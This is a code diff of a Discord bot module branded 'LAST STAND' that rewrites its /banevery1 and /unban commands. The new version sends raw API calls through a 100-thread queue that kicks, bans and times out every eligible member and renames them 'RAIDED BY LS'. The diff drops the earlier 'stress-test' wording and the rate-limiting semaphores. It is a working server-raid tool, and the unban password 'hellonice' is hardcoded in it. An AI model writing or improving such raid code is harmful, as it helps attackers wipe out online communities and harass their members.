@@ -1,21 +1,20 @@
 """
-ban.py — LAST STAND | /banevery1: mass ban + kick all eligible members concurrently.
+ban.py — LAST STAND | /banevery1, /unban
+Mass ban + kick + unban via 100-thread raw HTTP queue (c-realV2.py port).
 """
 
 import asyncio
-import random
+import datetime
 
 import discord
+import requests
 from discord import app_commands
 from discord.ext import commands
 
+from utils.http_queue import HttpQueue, API_BASE
 from utils.state import bot_state
 
-RAID_TAG  = "LAST STAND"
-RAID_SHORT = "LS"
-SEM_BAN   = 20
-SEM_KICK  = 20
-SEM_UNBAN = 20
+RAID_TAG       = "LAST STAND"
 UNBAN_PASSWORD = "hellonice"
 
 
@@ -25,7 +24,7 @@ class Ban(commands.Cog):
 
     @app_commands.command(
         name="banevery1",
-        description="☠️ Mass ban + kick all members concurrently to stress-test ban/kick protections.",
+        description="☠️ Mass ban + kick all members via 100-thread raw HTTP queue.",
     )
     @app_commands.describe(
         intensity="Ban rate 1–10. Default 10.",
@@ -53,10 +52,8 @@ class Ban(commands.Cog):
             return
 
         guild = interaction.guild
-        assert guild is not None
+        me    = guild.me
 
-        # Check bot has the permissions it actually needs before doing anything
-        me = guild.me
         missing: list[str] = []
         if not me.guild_permissions.ban_members:
             missing.append("Ban Members")
@@ -64,13 +61,10 @@ class Ban(commands.Cog):
             missing.append("Kick Members")
         if missing:
             await interaction.response.send_message(
-                f"❌ Bot is missing permissions: **{', '.join(missing)}**\n"
-                "Grant these in Server Settings → Roles.",
-                ephemeral=True,
+                f"❌ Bot is missing: **{', '.join(missing)}**", ephemeral=True
             )
             return
 
-        # Defer so we have time to chunk members (can take a second on large servers)
         await interaction.response.defer()
 
         try:
@@ -91,10 +85,9 @@ class Ban(commands.Cog):
             if not targets:
                 await interaction.followup.send(
                     "⚠️ No eligible targets found.\n"
-                    "Possible reasons:\n"
-                    "• All members have a role equal to or higher than the bot's role\n"
-                    "• Members Intent is not enabled in the Discord Developer Portal\n"
-                    "• Server has no non-bot members other than you",
+                    "• All members have a role ≥ bot's role\n"
+                    "• Server Members Intent not enabled\n"
+                    "• No non-bot members other than you",
                     ephemeral=True,
                 )
                 return
@@ -109,6 +102,7 @@ class Ban(commands.Cog):
                 f"┣ Intensity  : `{intensity}/10`\n"
                 f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
                 f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
+                f"┣ Engine     : `100-thread raw HTTP queue`\n"
                 f"┗ `/stop` halts immediately.",
             )
 
@@ -129,69 +123,45 @@ class Ban(commands.Cog):
         members: list[discord.Member],
         kick_first: bool,
     ) -> None:
-        sem_ban  = asyncio.Semaphore(SEM_BAN)
-        sem_kick = asyncio.Semaphore(SEM_KICK)
-        kicked = 0
-        banned = 0
-        failed = 0
+        q = HttpQueue.get()
 
         try:
             if kick_first:
-                kick_results = await asyncio.gather(
-                    *[self._kick_one(guild, m, sem_kick) for m in members],
-                    return_exceptions=True,
-                )
-                kicked = sum(1 for r in kick_results if r is True)
+                for m in members:
+                    q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
+                await q.join()
 
-            ban_results = await asyncio.gather(
-                *[self._ban_one(guild, m, sem_ban) for m in members],
-                return_exceptions=True,
-            )
-            banned = sum(1 for r in ban_results if r is True)
-            failed = len(members) - banned
+            timeout_until = (
+                datetime.datetime.utcnow() + datetime.timedelta(days=28)
+            ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+
+            for m in members:
+                q.put(
+                    requests.put,
+                    f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
+                    {"delete_message_days": 0},
+                )
+                q.put(
+                    requests.patch,
+                    f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
+                    {"communication_disabled_until": timeout_until, "nick": "RAIDED BY LS"},
+                )
+
+            await q.join()
 
         except asyncio.CancelledError:
-            pass
+            q.clear()
         finally:
             if bot_state.active_simulation == "banevery1":
                 bot_state.active_simulation = None
-
-            # Send a completion report
             try:
-                summary = (
-                    f"☠️ **Ban complete — {RAID_TAG}**\n"
-                    f"┣ Banned  : `{banned}/{len(members)}`\n"
+                await interaction.followup.send(
+                    f"☠️ **Ban+Kick complete — {RAID_TAG}**\n"
+                    f"┣ Targets processed : `{len(members)}`\n"
+                    f"┗ Engine            : `100-thread raw HTTP queue`"
                 )
-                if kick_first:
-                    summary += f"┣ Kicked  : `{kicked}/{len(members)}`\n"
-                summary += f"┗ Failed  : `{failed}` (higher role / already gone)"
-                await interaction.followup.send(summary)
             except Exception:
                 pass
-
-    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> bool:
-        if bot_state.stop_event.is_set():
-            return False
-        async with sem:
-            if bot_state.stop_event.is_set():
-                return False
-            try:
-                await guild.kick(member, reason=f"Stress-test by {RAID_TAG}")
-                return True
-            except discord.HTTPException:
-                return False
-
-    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> bool:
-        if bot_state.stop_event.is_set():
-            return False
-        async with sem:
-            if bot_state.stop_event.is_set():
-                return False
-            try:
-                await guild.ban(member, reason=f"Stress-test by {RAID_TAG}", delete_message_days=0)
-                return True
-            except discord.HTTPException:
-                return False
 
     @banevery1.error
     async def banevery1_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
@@ -208,27 +178,17 @@ class Ban(commands.Cog):
 
     @app_commands.command(
         name="unban",
-        description="✅ Mass-unban everyone banned in this server (test reset). Requires password.",
+        description="✅ Mass-unban everyone in this server. Requires password.",
     )
-    @app_commands.describe(
-        password="Required password to run this command.",
-    )
+    @app_commands.describe(password="Required password to run this command.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
-    async def unban(
-        self,
-        interaction: discord.Interaction,
-        password: str,
-    ) -> None:
-        # Password check — ephemeral so the password isn't visible in chat
+    async def unban(self, interaction: discord.Interaction, password: str) -> None:
         if password != UNBAN_PASSWORD:
-            await interaction.response.send_message(
-                "❌ Wrong password.", ephemeral=True
-            )
+            await interaction.response.send_message("❌ Wrong password.", ephemeral=True)
             return
 
         guild = interaction.guild
-        assert guild is not None
 
         if not guild.me.guild_permissions.ban_members:
             await interaction.response.send_message(
@@ -251,7 +211,8 @@ class Ban(commands.Cog):
 
             await interaction.followup.send(
                 f"✅ **MASS UNBAN — {RAID_TAG}**\n"
-                f"┣ Found : `{len(bans)}` banned users\n"
+                f"┣ Found  : `{len(bans)}` banned users\n"
+                f"┣ Engine : `100-thread raw HTTP queue`\n"
                 f"┗ Unbanning now…"
             )
 
@@ -270,30 +231,23 @@ class Ban(commands.Cog):
         guild: discord.Guild,
         bans: list[discord.BanEntry],
     ) -> None:
-        sem = asyncio.Semaphore(SEM_UNBAN)
-        results = await asyncio.gather(
-            *[self._unban_one(guild, entry.user, sem) for entry in bans],
-            return_exceptions=True,
-        )
-        unbanned = sum(1 for r in results if r is True)
-        failed   = len(bans) - unbanned
+        q = HttpQueue.get()
 
         try:
-            await interaction.followup.send(
-                f"✅ **Unban complete — {RAID_TAG}**\n"
-                f"┣ Unbanned : `{unbanned}/{len(bans)}`\n"
-                f"┗ Failed   : `{failed}` (left server / API error)"
-            )
-        except Exception:
-            pass
-
-    async def _unban_one(self, guild: discord.Guild, user: discord.User, sem: asyncio.Semaphore) -> bool:
-        async with sem:
+            for entry in bans:
+                q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/bans/{entry.user.id}")
+            await q.join()
+        except asyncio.CancelledError:
+            q.clear()
+        finally:
             try:
-                await guild.unban(user, reason=f"Test reset by {RAID_TAG}")
-                return True
-            except discord.HTTPException:
-                return False
+                await interaction.followup.send(
+                    f"✅ **Unban complete — {RAID_TAG}**\n"
+                    f"┣ Processed : `{len(bans)}` users\n"
+                    f"┗ Engine    : `100-thread raw HTTP queue`"
+                )
+            except Exception:
+                pass
 
     @unban.error
     async def unban_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
